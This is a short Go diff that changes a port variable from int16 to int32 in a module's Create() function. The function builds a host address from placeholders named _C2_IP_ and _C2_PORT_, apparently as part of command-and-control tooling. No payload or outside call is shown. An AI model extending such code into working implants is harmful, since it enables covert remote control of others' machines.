@@ -104,7 +104,7 @@ func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.I
 }
 
 func Create() types.Module {
-	port := int16(_C2_PORT_)
+	port := int32(_C2_PORT_)
 	ip := "_C2_IP_"
 	state := state{}
 	host := fmt.Sprintf("%s:%d", ip, port)
